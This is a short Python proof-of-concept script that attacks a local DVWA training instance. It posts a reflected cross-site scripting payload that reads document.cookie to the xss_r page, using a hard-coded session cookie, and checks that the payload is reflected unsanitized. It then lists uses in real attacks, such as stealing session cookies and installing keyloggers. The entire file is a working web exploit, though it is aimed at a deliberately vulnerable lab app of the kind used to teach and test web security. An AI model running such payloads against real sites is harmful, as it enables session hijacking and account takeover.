
import requests

# Use existing authenticated session
s = requests.Session()
s.cookies.update({'PHPSESSID': '9f8c8our5hpn5aqrjdbg4k9er5', 'security': 'low'})

# Reflected XSS vulnerability in DVWA
url = "http://localhost:28080/vulnerabilities/xss_r/"

# Inject JavaScript that would steal cookies or perform actions
# This payload displays an alert with the user's cookies
xss_payload = '<script>alert("XSS Attack! Your session: " + document.cookie);</script>'

data = {
    "name": xss_payload,
    "Submit": "Submit"
}

print("[*] Executing Reflected XSS attack...")
r = s.post(url, data=data)

if r.status_code == 200:
    print("[+] XSS payload injected!")
    
    # Check if the script tag is in the response (not sanitized)
    if '<script>alert(' in r.text:
        print("[+] SUCCESS: XSS payload reflected without sanitization!")
        print("\n[*] Attack details:")
        print(f"  - Vulnerability: Reflected Cross-Site Scripting (XSS)")
        print(f"  - Payload: {xss_payload}")
        print(f"  - Impact: Can steal session cookies, redirect users, or execute arbitrary JavaScript")
        
        # Extract the vulnerable part of the response
        import re
        match = re.search(r'<pre>Hello (.*?)</pre>', r.text, re.DOTALL)
        if match:
            print(f"\n[*] Reflected content: Hello {match.group(1)}")
    else:
        print("[-] Payload may have been sanitized or filtered")
else:
    print(f"[-] Request failed with status {r.status_code}")

print("\n[+] Demonstrated reflected XSS vulnerability in DVWA")
print("[*] In a real attack, this could be used to:")
print("  - Steal session cookies from victims")
print("  - Perform actions on behalf of authenticated users")
print("  - Redirect to malicious sites")
print("  - Install keyloggers or other malicious scripts")

